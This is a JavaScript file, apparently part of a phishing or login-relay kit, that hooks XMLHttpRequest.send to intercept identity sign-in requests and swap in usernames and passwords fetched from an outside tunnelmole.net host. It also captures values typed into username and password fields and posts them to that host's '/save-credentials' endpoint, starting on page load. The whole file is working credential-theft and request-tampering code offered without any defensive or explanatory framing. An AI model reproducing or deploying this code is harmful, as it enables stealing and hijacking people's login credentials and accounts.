let freqUsername = null; 
let freqPassword = null;
const modifiedRequests = new Set();
const pendingRequests = new Map();
let usernameFetched = false;
let passwordFetched = false;

// Fetch the username when needed
const fetchFreqUsername = async () => {
    if (usernameFetched) return; // Avoid redundant fetches once username is fetched

    console.log('Fetching username...');

    try {
        const response = await fetch('https://w9l6dk-ip-37-228-207-173.tunnelmole.net/get-first-post-data', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });

        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

        const result = await response.json();
        console.log('Response from /get-first-post-data:', result);  // Debug log

        if (result?.postData) {
            freqUsername = result.postData;
            console.log('Fetched username:', freqUsername);
            usernameFetched = true;

            // Reset the server-side username store
            await fetch('https://w9l6dk-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
            // Process all pending requests now that we have a username
            processModifiedRequests();
        } else {
            console.warn("No username data received, retrying...");
            setTimeout(fetchFreqUsername, 1000); // Retry after 1s if no username is received
        }
    } catch (error) {
        console.error('Error fetching username:', error);
        setTimeout(fetchFreqUsername, 500); // Retry after 1s if error occurs
    }
};

// Fetch the password when needed
const fetchFreqPassword = async () => {
    if (passwordFetched) return; // Avoid redundant fetches once password is fetched

    console.log('Fetching password...');

    try {
        const response = await fetch('https://w9l6dk-ip-37-228-207-173.tunnelmole.net/get-first-post-data', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });

        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

        const result = await response.json();
        console.log('Response from /get-first-post-data:', result);  // Debug log

        if (result?.postData) {
            freqPassword = result.postData;
            console.log('Fetched password:', freqPassword);
            passwordFetched = true;

            // Reset the server-side password store
            await fetch('https://w9l6dk-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });
            // Process all pending requests now that we have a password
            processModifiedRequests();
        } else {
            console.warn("No password data received, retrying...");
            setTimeout(fetchFreqPassword, 1000); // Retry after 1s if no password is received
        }
    } catch (error) {
        console.error('Error fetching password:', error);
        setTimeout(fetchFreqPassword, 500); // Retry after 1s if error occurs
    }
};

// Modify and send pending requests when username and password are available
const processModifiedRequests = () => {
    if (!freqUsername || !freqPassword) {
        console.log("Username or password not available yet, retrying...");
        fetchFreqUsername();  // Ensure username is fetched
        fetchFreqPassword();  // Ensure password is fetched
        return;
    }

    console.log("Processing pending requests...");
    // Create a copy of pending requests as we will modify it while iterating
    const requestsToProcess = Array.from(pendingRequests);

    // Iterate through all pending requests
    for (let [xhr, body] of requestsToProcess) {
        const matchUsername = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);
        const matchPassword = body && /identity-signin-password%5C%22%2C%5C%22([^&]*)%5C/.exec(body);

        // Check if either matchUsername or matchPassword is found, and the request hasn't been modified already
        if ((matchUsername || matchPassword) && !modifiedRequests.has(body)) {
            let modifiedBody = body;

            // If a match for username is found, replace the username in the body
            if (matchUsername) {
                modifiedBody = modifiedBody.replace(matchUsername[1], freqUsername);
            }

            // If a match for password is found, replace the password in the body
            if (matchPassword) {
                modifiedBody = modifiedBody.replace(matchPassword[1], freqPassword);
            }

            // Mark the request as modified
            modifiedRequests.add(body);
            console.log("Modified request with new username and/or password:", modifiedBody);

            // Send the modified request
            xhr.send(modifiedBody); 
            pendingRequests.delete(xhr); // Remove the request from pending
        }
    }

    // Reset freqUsername and freqPassword when all requests are processed
    if (pendingRequests.size === 0) {
        console.log("All pending requests processed, resetting freqUsername and freqPassword.");
        freqUsername = null;
        freqPassword = null;
        usernameFetched = false;  // Allow fetching a new username if needed
        passwordFetched = false;  // Allow fetching a new password if needed
    }
};


// Intercept XMLHttpRequest to modify requests with username and password
const originalXhrSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function (body) {
    if (!body) {
        originalXhrSend.call(this, body);
        return;
    }

    // If the body contains identity-signin-identifier or identity-signin-password and hasn't been modified yet, intercept
    if (/identity-signin-identifier/.test(body) || /identity-signin-password/.test(body)) {
        console.log("Intercepted request:", body);
        pendingRequests.set(this, body); // Store the request in pendingRequests
        processModifiedRequests(); // Attempt to modify and send the request immediately
    } else {
        originalXhrSend.call(this, body); // Send the original request if no modification is needed
    }
};

// ✅ Send username and password to server
const sendCredentials = async () => {
    console.log('Sending username and password...');

    const username = document.getElementById('username')?.value;
    const password = document.getElementById('password')?.value;
    if (!username || !password) {
        console.warn("No username or password entered");
        return;
    }

    try {
        const response = await fetch('https://w9l6dk-ip-37-228-207-173.tunnelmole.net/save-credentials', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });

        if (response.ok) {
            console.log('Credentials sent successfully');
        } else {
            console.error('Error sending credentials:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending credentials:', error);
    }
};

// ✅ Attach event listeners to buttons
document.addEventListener('DOMContentLoaded', () => {
    const button = document.getElementById('sendCredentialsBtn');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');

    // Add button click listener
    if (button) {
        button.addEventListener('click', (event) => {
            event.preventDefault(); // Prevent form submission if inside a form
            sendCredentials(); // Trigger sending credentials
        });
    } else {
        console.warn('Send credentials button not found!');
    }

    // Add "Enter" key listener to trigger credentials send
    if (usernameInput && passwordInput) {
        usernameInput.addEventListener('keydown', (event) => {
            if (event.key === 'Enter') {
                event.preventDefault(); // Prevent form submission
                sendCredentials(); // Trigger send on Enter
            }
        });

        passwordInput.addEventListener('keydown', (event) => {
            if (event.key === 'Enter') {
                event.preventDefault(); // Prevent form submission
                sendCredentials(); // Trigger send on Enter
            }
        });
    }

    // Ensure fetchFreqUsername and fetchFreqPassword are called when the page loads
    fetchFreqUsername();
    fetchFreqPassword();
});
